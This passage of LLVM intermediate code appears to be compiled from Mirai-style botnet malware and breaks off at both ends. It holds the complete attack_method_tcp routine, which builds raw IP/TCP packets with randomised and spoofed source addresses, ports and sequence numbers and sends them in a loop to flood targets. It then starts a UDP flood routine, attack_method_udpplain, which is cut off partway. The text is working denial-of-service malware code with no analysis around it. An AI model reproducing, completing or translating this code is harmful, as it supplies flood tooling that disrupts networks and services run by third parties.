  ]

.thread584:                                       ; preds = %.preheader592
  store i32 104, i32* %1038, align 4
  br label %.thread578

; <label>:1042:                                   ; preds = %.preheader592
  %.pr583 = load i32, i32* %1038, align 4
  %1043 = icmp eq i32 %.pr583, 11
  br i1 %1043, label %1046, label %.thread578

.thread578:                                       ; preds = %1042, %.thread584
  %1044 = load i32, i32* %406, align 4
  %1045 = call i32 @close(i32 %1044) #7
  store i32 -1, i32* %406, align 4
  store i8 0, i8* %442, align 4
  br label %.loopexit591

; <label>:1046:                                   ; preds = %1042
  %.pr577 = load i8, i8* %442, align 4
  %1047 = icmp eq i8 %.pr577, 0
  br i1 %1047, label %.loopexit591, label %1048

; <label>:1048:                                   ; preds = %1046
  store i8 1, i8* %442, align 4
  br label %.loopexit591

.loopexit591.loopexit:                            ; preds = %.backedge
  br label %.loopexit591

.loopexit591:                                     ; preds = %.loopexit591.loopexit, %1025, %1019, %993, %.thread578, %441, %921, %1046, %430, %923, %1048, %903, %460, %.lr.ph633, %890, %729, %457, %426
  %indvars.iv.next660 = add nuw nsw i64 %indvars.iv659, 1
  %1049 = icmp slt i64 %indvars.iv.next660, %48
  br i1 %1049, label %.lr.ph633, label %.backedge596.loopexit

; <label>:1050:                                   ; preds = %30, %27, %24, %4
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i32 @util_strlen(i8*) local_unnamed_addr #3

declare void @table_unlock_val(i8 zeroext) local_unnamed_addr #3

declare i32 @util_strcpy(i8*, i8*) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

declare i32 @rand_next() local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

declare i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #3

declare void @table_lock_val(i8 zeroext) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

declare void @util_zero(i8*, i32) local_unnamed_addr #3

declare i8* @util_itoa(i32, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strcmp(i8*, i8*) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @util_memsearch(i8*, i32, i8*, i32) local_unnamed_addr #3

declare i32 @util_stristr(i8*, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strncmp(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %349, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #7
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %121, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = or i16 %63, 160
  br i1 %45, label %.lr.ph130.split.us.preheader, label %.lr.ph130.split.preheader

.lr.ph130.split.preheader:                        ; preds = %.lr.ph130
  br label %.lr.ph130.split

.lr.ph130.split.us.preheader:                     ; preds = %.lr.ph130
  br label %.lr.ph130.split.us

.lr.ph130.split.us:                               ; preds = %.lr.ph130.split.us.preheader, %.lr.ph130.split.us
  %65 = phi i32 [ %119, %.lr.ph130.split.us ], [ 0, %.lr.ph130.split.us.preheader ]
  %66 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds i8*, i8** %8, i64 %67
  store i8* %66, i8** %68, align 8
  %69 = getelementptr inbounds i8, i8* %66, i64 20
  %70 = getelementptr inbounds i8, i8* %66, i64 40
  store i8 69, i8* %66, align 4
  %71 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %10, i8* %71, align 1
  %72 = call zeroext i16 @htons(i16 zeroext 60) #8
  %73 = getelementptr inbounds i8, i8* %66, i64 2
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 2
  %75 = call zeroext i16 @htons(i16 zeroext %12) #8
  %76 = getelementptr inbounds i8, i8* %66, i64 4
  %77 = bitcast i8* %76 to i16*
  store i16 %75, i16* %77, align 4
  %78 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %14, i8* %78, align 4
  %79 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 6, i8* %79, align 1
  %80 = getelementptr inbounds i8, i8* %66, i64 12
  %81 = bitcast i8* %80 to i32*
  store i32 %36, i32* %81, align 4
  %82 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %67, i32 1
  %83 = load i32, i32* %82, align 4
  %84 = getelementptr inbounds i8, i8* %66, i64 16
  %85 = bitcast i8* %84 to i32*
  store i32 %83, i32* %85, align 4
  %86 = call zeroext i16 @htons(i16 zeroext %18) #8
  %87 = bitcast i8* %69 to i16*
  store i16 %86, i16* %87, align 4
  %88 = call zeroext i16 @htons(i16 zeroext %20) #8
  %89 = getelementptr inbounds i8, i8* %66, i64 22
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 2
  %91 = call zeroext i16 @htons(i16 zeroext %46) #8
  %92 = zext i16 %91 to i32
  %93 = getelementptr inbounds i8, i8* %66, i64 24
  %94 = bitcast i8* %93 to i32*
  store i32 %92, i32* %94, align 4
  %95 = getelementptr inbounds i8, i8* %66, i64 32
  %96 = bitcast i8* %95 to i16*
  store i16 %64, i16* %96, align 4
  %97 = getelementptr inbounds i8, i8* %66, i64 41
  store i8 2, i8* %70, align 1
  %98 = getelementptr inbounds i8, i8* %66, i64 42
  store i8 6, i8* %97, align 1
  %99 = call i32 @rand_next() #7
  %100 = and i32 %99, 15
  %101 = add nuw nsw i32 %100, 1458
  %102 = trunc i32 %101 to i16
  %103 = call zeroext i16 @htons(i16 zeroext %102) #8
  %104 = bitcast i8* %98 to i16*
  store i16 %103, i16* %104, align 2
  %105 = getelementptr inbounds i8, i8* %66, i64 44
  %106 = getelementptr inbounds i8, i8* %66, i64 45
  store i8 4, i8* %105, align 1
  %107 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 2, i8* %106, align 1
  %108 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 8, i8* %107, align 1
  %109 = getelementptr inbounds i8, i8* %66, i64 48
  store i8 10, i8* %108, align 1
  %110 = call i32 @rand_next() #7
  %111 = bitcast i8* %109 to i32*
  store i32 %110, i32* %111, align 4
  %112 = getelementptr inbounds i8, i8* %66, i64 52
  %113 = bitcast i8* %112 to i32*
  store i32 0, i32* %113, align 4
  %114 = getelementptr inbounds i8, i8* %66, i64 56
  %115 = getelementptr inbounds i8, i8* %66, i64 57
  store i8 1, i8* %114, align 1
  %116 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 3, i8* %115, align 1
  %117 = getelementptr inbounds i8, i8* %66, i64 59
  store i8 3, i8* %116, align 1
  store i8 8, i8* %117, align 1
  %118 = load i32, i32* %5, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %5, align 4
  %120 = icmp slt i32 %119, %43
  br i1 %120, label %.lr.ph130.split.us, label %.preheader.loopexit

; <label>:121:                                    ; preds = %39
  %122 = call i32 @close(i32 %37) #7
  br label %349

.preheader.loopexit:                              ; preds = %.lr.ph130.split.us
  br label %.preheader

.preheader.loopexit138:                           ; preds = %.lr.ph130.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit138, %.preheader.loopexit, %.preheader128
  %123 = icmp eq i32 %36, -1
  %124 = and i32 %11, 65535
  %125 = icmp eq i32 %124, 65535
  %126 = and i32 %17, 65535
  %127 = icmp eq i32 %126, 65535
  %128 = and i32 %19, 65535
  %129 = icmp eq i32 %128, 65535
  %130 = icmp eq i32 %21, 65535
  %131 = icmp eq i32 %22, 65535
  %132 = icmp eq i8 %24, 0
  br label %.loopexit

.lr.ph130.split:                                  ; preds = %.lr.ph130.split.preheader, %.lr.ph130.split
  %133 = phi i32 [ %190, %.lr.ph130.split ], [ 0, %.lr.ph130.split.preheader ]
  %134 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %135 = sext i32 %133 to i64
  %136 = getelementptr inbounds i8*, i8** %8, i64 %135
  store i8* %134, i8** %136, align 8
  %137 = getelementptr inbounds i8, i8* %134, i64 20
  %138 = getelementptr inbounds i8, i8* %134, i64 40
  store i8 69, i8* %134, align 4
  %139 = getelementptr inbounds i8, i8* %134, i64 1
  store i8 %10, i8* %139, align 1
  %140 = call zeroext i16 @htons(i16 zeroext 60) #8
  %141 = getelementptr inbounds i8, i8* %134, i64 2
  %142 = bitcast i8* %141 to i16*
  store i16 %140, i16* %142, align 2
  %143 = call zeroext i16 @htons(i16 zeroext %12) #8
  %144 = getelementptr inbounds i8, i8* %134, i64 4
  %145 = bitcast i8* %144 to i16*
  store i16 %143, i16* %145, align 4
  %146 = getelementptr inbounds i8, i8* %134, i64 8
  store i8 %14, i8* %146, align 4
  %147 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %148 = getelementptr inbounds i8, i8* %134, i64 6
  %149 = bitcast i8* %148 to i16*
  store i16 %147, i16* %149, align 2
  %150 = getelementptr inbounds i8, i8* %134, i64 9
  store i8 6, i8* %150, align 1
  %151 = getelementptr inbounds i8, i8* %134, i64 12
  %152 = bitcast i8* %151 to i32*
  store i32 %36, i32* %152, align 4
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %135, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = getelementptr inbounds i8, i8* %134, i64 16
  %156 = bitcast i8* %155 to i32*
  store i32 %154, i32* %156, align 4
  %157 = call zeroext i16 @htons(i16 zeroext %18) #8
  %158 = bitcast i8* %137 to i16*
  store i16 %157, i16* %158, align 4
  %159 = call zeroext i16 @htons(i16 zeroext %20) #8
  %160 = getelementptr inbounds i8, i8* %134, i64 22
  %161 = bitcast i8* %160 to i16*
  store i16 %159, i16* %161, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %46) #8
  %163 = zext i16 %162 to i32
  %164 = getelementptr inbounds i8, i8* %134, i64 24
  %165 = bitcast i8* %164 to i32*
  store i32 %163, i32* %165, align 4
  %166 = getelementptr inbounds i8, i8* %134, i64 32
  %167 = bitcast i8* %166 to i16*
  store i16 %64, i16* %167, align 4
  %168 = getelementptr inbounds i8, i8* %134, i64 41
  store i8 2, i8* %138, align 1
  %169 = getelementptr inbounds i8, i8* %134, i64 42
  store i8 6, i8* %168, align 1
  %170 = call i32 @rand_next() #7
  %171 = and i32 %170, 15
  %172 = add nuw nsw i32 %171, 1458
  %173 = trunc i32 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #8
  %175 = bitcast i8* %169 to i16*
  store i16 %174, i16* %175, align 2
  %176 = getelementptr inbounds i8, i8* %134, i64 44
  %177 = getelementptr inbounds i8, i8* %134, i64 45
  store i8 4, i8* %176, align 1
  %178 = getelementptr inbounds i8, i8* %134, i64 46
  store i8 2, i8* %177, align 1
  %179 = getelementptr inbounds i8, i8* %134, i64 47
  store i8 8, i8* %178, align 1
  %180 = getelementptr inbounds i8, i8* %134, i64 48
  store i8 10, i8* %179, align 1
  %181 = call i32 @rand_next() #7
  %182 = bitcast i8* %180 to i32*
  store i32 %181, i32* %182, align 4
  %183 = getelementptr inbounds i8, i8* %134, i64 52
  %184 = bitcast i8* %183 to i32*
  store i32 0, i32* %184, align 4
  %185 = getelementptr inbounds i8, i8* %134, i64 56
  %186 = getelementptr inbounds i8, i8* %134, i64 57
  store i8 1, i8* %185, align 1
  %187 = getelementptr inbounds i8, i8* %134, i64 58
  store i8 3, i8* %186, align 1
  %188 = getelementptr inbounds i8, i8* %134, i64 59
  store i8 3, i8* %187, align 1
  store i8 8, i8* %188, align 1
  %189 = load i32, i32* %5, align 4
  %190 = add nsw i32 %189, 1
  store i32 %190, i32* %5, align 4
  %191 = icmp slt i32 %190, %43
  br i1 %191, label %.lr.ph130.split, label %.preheader.loopexit138

.loopexit.loopexit:                               ; preds = %251
  br label %.loopexit.backedge

.loopexit.loopexit137:                            ; preds = %328
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit137
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %123, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %251
  %storemerge122129.us = phi i32 [ %270, %251 ], [ 0, %.lr.ph.split.us.preheader ]
  %192 = sext i32 %storemerge122129.us to i64
  %193 = getelementptr inbounds i8*, i8** %8, i64 %192
  %194 = load i8*, i8** %193, align 8
  %195 = bitcast i8* %194 to %struct.iphdr*
  %196 = getelementptr inbounds i8, i8* %194, i64 20
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %192, i32 2
  %198 = load i8, i8* %197, align 4
  %199 = icmp ult i8 %198, 32
  br i1 %199, label %200, label %215

; <label>:200:                                    ; preds = %.lr.ph.split.us
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %192, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = call i32 @ntohl(i32 %202) #8
  %204 = call i32 @rand_next() #7
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %206, i32 2
  %208 = load i8, i8* %207, align 4
  %209 = zext i8 %208 to i32
  %210 = lshr i32 %204, %209
  %211 = add i32 %210, %203
  %212 = call i32 @htonl(i32 %211) #8
  %213 = getelementptr inbounds i8, i8* %194, i64 16
  %214 = bitcast i8* %213 to i32*
  store i32 %212, i32* %214, align 4
  br label %215

; <label>:215:                                    ; preds = %.lr.ph.split.us, %200
  %216 = call i32 @rand_next() #7
  %217 = getelementptr inbounds i8, i8* %194, i64 12
  %218 = bitcast i8* %217 to i32*
  store i32 %216, i32* %218, align 4
  br i1 %125, label %219, label %224

; <label>:219:                                    ; preds = %215
  %220 = call i32 @rand_next() #7
  %221 = trunc i32 %220 to i16
  %222 = getelementptr inbounds i8, i8* %194, i64 4
  %223 = bitcast i8* %222 to i16*
  store i16 %221, i16* %223, align 4
  br label %224

; <label>:224:                                    ; preds = %219, %215
  br i1 %127, label %225, label %229

; <label>:225:                                    ; preds = %224
  %226 = call i32 @rand_next() #7
  %227 = trunc i32 %226 to i16
  %228 = bitcast i8* %196 to i16*
  store i16 %227, i16* %228, align 4
  br label %229

; <label>:229:                                    ; preds = %225, %224
  br i1 %129, label %230, label %235

; <label>:230:                                    ; preds = %229
  %231 = call i32 @rand_next() #7
  %232 = trunc i32 %231 to i16
  %233 = getelementptr inbounds i8, i8* %194, i64 22
  %234 = bitcast i8* %233 to i16*
  store i16 %232, i16* %234, align 2
  br label %235

; <label>:235:                                    ; preds = %230, %229
  br i1 %130, label %236, label %240

; <label>:236:                                    ; preds = %235
  %237 = call i32 @rand_next() #7
  %238 = getelementptr inbounds i8, i8* %194, i64 24
  %239 = bitcast i8* %238 to i32*
  store i32 %237, i32* %239, align 4
  br label %240

; <label>:240:                                    ; preds = %236, %235
  br i1 %131, label %241, label %245

; <label>:241:                                    ; preds = %240
  %242 = call i32 @rand_next() #7
  %243 = getelementptr inbounds i8, i8* %194, i64 28
  %244 = bitcast i8* %243 to i32*
  store i32 %242, i32* %244, align 4
  br label %245

; <label>:245:                                    ; preds = %241, %240
  br i1 %132, label %251, label %246

; <label>:246:                                    ; preds = %245
  %247 = call i32 @rand_next() #7
  %248 = trunc i32 %247 to i16
  %249 = getelementptr inbounds i8, i8* %194, i64 38
  %250 = bitcast i8* %249 to i16*
  store i16 %248, i16* %250, align 2
  br label %251

; <label>:251:                                    ; preds = %246, %245
  %252 = getelementptr inbounds i8, i8* %194, i64 10
  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  %254 = bitcast i8* %194 to i16*
  %255 = call zeroext i16 @checksum_generic(i16* %254, i32 20) #7
  store i16 %255, i16* %253, align 2
  %256 = getelementptr inbounds i8, i8* %194, i64 36
  %257 = bitcast i8* %256 to i16*
  store i16 0, i16* %257, align 4
  %258 = call zeroext i16 @htons(i16 zeroext 40) #8
  %259 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %195, i8* nonnull %196, i16 zeroext %258, i32 40) #7
  store i16 %259, i16* %257, align 4
  %260 = getelementptr inbounds i8, i8* %194, i64 22
  %261 = bitcast i8* %260 to i16*
  %262 = load i16, i16* %261, align 2
  %263 = load i32, i32* %5, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %264, i32 0, i32 1
  store i16 %262, i16* %265, align 2
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %264, i32 0
  %267 = bitcast %struct.sockaddr_in* %266 to %struct.sockaddr*
  %268 = call i64 @sendto(i32 %37, i8* nonnull %194, i64 60, i32 16384, %struct.sockaddr* %267, i32 16) #7
  %269 = load i32, i32* %5, align 4
  %270 = add nsw i32 %269, 1
  store i32 %270, i32* %5, align 4
  %271 = icmp slt i32 %270, %43
  br i1 %271, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %328
  %storemerge122129 = phi i32 [ %347, %328 ], [ 0, %.lr.ph.split.preheader ]
  %272 = sext i32 %storemerge122129 to i64
  %273 = getelementptr inbounds i8*, i8** %8, i64 %272
  %274 = load i8*, i8** %273, align 8
  %275 = bitcast i8* %274 to %struct.iphdr*
  %276 = getelementptr inbounds i8, i8* %274, i64 20
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 2
  %278 = load i8, i8* %277, align 4
  %279 = icmp ult i8 %278, 32
  br i1 %279, label %280, label %295

; <label>:280:                                    ; preds = %.lr.ph.split
  %281 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 1
  %282 = load i32, i32* %281, align 4
  %283 = call i32 @ntohl(i32 %282) #8
  %284 = call i32 @rand_next() #7
  %285 = load i32, i32* %5, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %286, i32 2
  %288 = load i8, i8* %287, align 4
  %289 = zext i8 %288 to i32
  %290 = lshr i32 %284, %289
  %291 = add i32 %290, %283
  %292 = call i32 @htonl(i32 %291) #8
  %293 = getelementptr inbounds i8, i8* %274, i64 16
  %294 = bitcast i8* %293 to i32*
  store i32 %292, i32* %294, align 4
  br label %295

; <label>:295:                                    ; preds = %.lr.ph.split, %280
  br i1 %125, label %296, label %301

; <label>:296:                                    ; preds = %295
  %297 = call i32 @rand_next() #7
  %298 = trunc i32 %297 to i16
  %299 = getelementptr inbounds i8, i8* %274, i64 4
  %300 = bitcast i8* %299 to i16*
  store i16 %298, i16* %300, align 4
  br label %301

; <label>:301:                                    ; preds = %296, %295
  br i1 %127, label %302, label %306

; <label>:302:                                    ; preds = %301
  %303 = call i32 @rand_next() #7
  %304 = trunc i32 %303 to i16
  %305 = bitcast i8* %276 to i16*
  store i16 %304, i16* %305, align 4
  br label %306

; <label>:306:                                    ; preds = %302, %301
  br i1 %129, label %307, label %312

; <label>:307:                                    ; preds = %306
  %308 = call i32 @rand_next() #7
  %309 = trunc i32 %308 to i16
  %310 = getelementptr inbounds i8, i8* %274, i64 22
  %311 = bitcast i8* %310 to i16*
  store i16 %309, i16* %311, align 2
  br label %312

; <label>:312:                                    ; preds = %307, %306
  br i1 %130, label %313, label %317

; <label>:313:                                    ; preds = %312
  %314 = call i32 @rand_next() #7
  %315 = getelementptr inbounds i8, i8* %274, i64 24
  %316 = bitcast i8* %315 to i32*
  store i32 %314, i32* %316, align 4
  br label %317

; <label>:317:                                    ; preds = %313, %312
  br i1 %131, label %318, label %322

; <label>:318:                                    ; preds = %317
  %319 = call i32 @rand_next() #7
  %320 = getelementptr inbounds i8, i8* %274, i64 28
  %321 = bitcast i8* %320 to i32*
  store i32 %319, i32* %321, align 4
  br label %322

; <label>:322:                                    ; preds = %318, %317
  br i1 %132, label %328, label %323

; <label>:323:                                    ; preds = %322
  %324 = call i32 @rand_next() #7
  %325 = trunc i32 %324 to i16
  %326 = getelementptr inbounds i8, i8* %274, i64 38
  %327 = bitcast i8* %326 to i16*
  store i16 %325, i16* %327, align 2
  br label %328

; <label>:328:                                    ; preds = %322, %323
  %329 = getelementptr inbounds i8, i8* %274, i64 10
  %330 = bitcast i8* %329 to i16*
  store i16 0, i16* %330, align 2
  %331 = bitcast i8* %274 to i16*
  %332 = call zeroext i16 @checksum_generic(i16* %331, i32 20) #7
  store i16 %332, i16* %330, align 2
  %333 = getelementptr inbounds i8, i8* %274, i64 36
  %334 = bitcast i8* %333 to i16*
  store i16 0, i16* %334, align 4
  %335 = call zeroext i16 @htons(i16 zeroext 40) #8
  %336 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %275, i8* %276, i16 zeroext %335, i32 40) #7
  store i16 %336, i16* %334, align 4
  %337 = getelementptr inbounds i8, i8* %274, i64 22
  %338 = bitcast i8* %337 to i16*
  %339 = load i16, i16* %338, align 2
  %340 = load i32, i32* %5, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %341, i32 0, i32 1
  store i16 %339, i16* %342, align 2
  %343 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %341, i32 0
  %344 = bitcast %struct.sockaddr_in* %343 to %struct.sockaddr*
  %345 = call i64 @sendto(i32 %37, i8* %274, i64 60, i32 16384, %struct.sockaddr* %344, i32 16) #7
  %346 = load i32, i32* %5, align 4
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %5, align 4
  %348 = icmp slt i32 %347, %43
  br i1 %348, label %.lr.ph.split, label %.loopexit.loopexit137

; <label>:349:                                    ; preds = %4, %121
  ret void
}

declare zeroext i16 @checksum_generic(i16*, i32) local_unnamed_addr #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) local_unnamed_addr #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #7
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %20, label %23

; <label>:20:                                     ; preds = %4
  %21 = tail call i32 @rand_next() #7
  %22 = trunc i32 %21 to i16
  br label %26

; <label>:23:                                     ; preds = %4
  %24 = trunc i32 %13 to i16
  %25 = tail call zeroext i16 @htons(i16 zeroext %24) #8
  br label %26

; <label>:26:                                     ; preds = %23, %20
  %.058 = phi i16 [ %22, %20 ], [ %25, %23 ]
  %27 = zext i8 %0 to i32
  %28 = icmp eq i8 %0, 0
  br i1 %28, label %.preheader.split.preheader, label %.lr.ph65

.preheader.split.preheader:                       ; preds = %.preheader, %26
  br label %.preheader.split

.lr.ph65:                                         ; preds = %26
  %29 = and i32 %11, 65535
  %30 = icmp eq i32 %29, 65535
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = zext i8 %0 to i64
  br i1 %30, label %.lr.ph65.split.us.preheader, label %.lr.ph65.split.preheader

.lr.ph65.split.preheader:                         ; preds = %.lr.ph65
  br label %.lr.ph65.split

.lr.ph65.split.us.preheader:                      ; preds = %.lr.ph65
  br label %.lr.ph65.split.us

.lr.ph65.split.us:                                ; preds = %.lr.ph65.split.us.preheader, %61
  %indvars.iv = phi i64 [ %indvars.iv.next, %61 ], [ 0, %.lr.ph65.split.us.preheader ]
